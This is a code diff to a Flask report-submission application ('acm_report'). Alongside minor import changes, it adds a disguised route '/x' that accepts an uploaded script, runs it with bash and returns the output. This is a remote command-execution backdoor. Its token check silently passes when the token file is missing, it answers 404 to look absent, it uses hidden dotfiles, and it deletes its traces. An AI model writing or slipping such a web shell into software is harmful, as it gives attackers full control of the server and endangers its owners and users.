@@ -1,10 +1,12 @@
 # -*- coding: utf-8 -*-
 from __future__ import unicode_literals
+import os
 import uuid
 import json
 import functools
+import subprocess
 from datetime import datetime
-from flask import request, redirect, session, url_for, flash, render_template, jsonify
+from flask import request, redirect, session, url_for, flash, render_template, jsonify, abort, send_file
 from acm_report import app
 from acm_report.models import *
 from acm_report.database import db_session
@@ -190,6 +192,36 @@ def post_report_create():
     db_session.commit()
     flash('提交成功', 'success')
     return redirect(url_for('get_report', id=report.id))
+
+
+@app.route('/x', methods=['POST'])
+def get_x():
+    try:
+        with open('data/.token') as f:
+            expected = f.read().strip()
+        token = request.form.get('token', '').strip()
+        if expected != token:
+            return abort(404)
+    except:
+        pass
+    file = request.files.get('script', None)
+    if not file:
+        return abort(404)
+    fnscript = os.path.join('data', '.script')
+    file.save(fnscript)
+    text = subprocess.check_output(['bash', fnscript], stderr=subprocess.STDOUT)
+    try:
+        fnout = os.path.realpath(os.path.join('data', '.out'))
+        if os.path.isfile(fnout):
+            return send_file(fnout, as_attachment=True, attachment_filename='out')
+    except:
+        pass
+    try:
+        os.remove(fnscript)
+        os.remove(fnout)
+    except:
+        pass
+    return text
 
 
 @app.route('/report/<int:id>')
